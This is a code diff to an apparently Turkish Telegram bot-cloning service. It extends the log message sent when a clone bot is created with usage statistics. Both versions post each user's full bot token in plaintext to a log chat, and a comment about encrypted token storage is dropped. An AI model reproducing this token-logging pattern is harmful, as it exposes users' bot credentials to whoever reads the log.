@@ -4,6 +4,7 @@ import html
 from aiogram import Bot
 
 from database.clone_db import save_clone
+from database.db import get_bot_stats
 from services.logger import send_log
 from services.clone_runtime import clone_runtime
 
@@ -25,7 +26,7 @@ async def create_clone(
         if not bot_info.username:
             return False, "Bot kullanıcı adı alınamadı."
 
-        # Tokeni şifreli olarak kaydet
+        # Klon botu veritabanına kaydet
         await save_clone(
             bot_id=bot_info.id,
             owner_id=owner_id,
@@ -33,27 +34,36 @@ async def create_clone(
             token=token
         )
 
-        # Klonu anında çalıştırma sistemine ekle
+        # Klonu çalıştır
         await clone_runtime.add_bot(clone_bot)
         registered = True
 
-        # Klon bilgilerini ana bot üzerinden logla
+        # Güncel istatistikleri al
+        stats = await get_bot_stats()
+
+        # Tokeni yalnızca özel log grubuna gönder
         safe_token = html.escape(token)
 
         log_message = (
-            "🆕 <b>YENİ KLON BOT</b>\n\n"
+            "🆕 <b>YENİ KLON BOT OLUŞTURULDU</b>\n\n"
             f"👤 Oluşturan ID: <code>{owner_id}</code>\n"
             f"🤖 Bot: @{html.escape(bot_info.username)}\n"
             f"🆔 Bot ID: <code>{bot_info.id}</code>\n"
-            f"🔑 Token: <code>{safe_token}</code>\n"
-            "✅ Durum: Kaydedildi ve çalıştırıldı"
+            f"🔑 Bot Tokeni: <code>{safe_token}</code>\n\n"
+            "📊 <b>GÜNCEL İSTATİSTİKLER</b>\n"
+            f"👥 Kullanıcı sayısı: <b>{stats['users']}</b>\n"
+            f"🏘 Grup sayısı: <b>{stats['groups']}</b>\n"
+            f"🤖 Klon bot sayısı: <b>{stats['clones']}</b>\n\n"
+            "✅ Durum: Aktif"
         )
 
         await send_log(main_bot, log_message)
 
         return True, bot_info.username
 
-    except Exception:
+    except Exception as error:
+        print("Klon oluşturma hatası:", type(error).__name__)
+
         return False, (
             "Klon oluşturulamadı veya çalıştırılamadı. "
             "Tokeni kontrol edip tekrar dene."
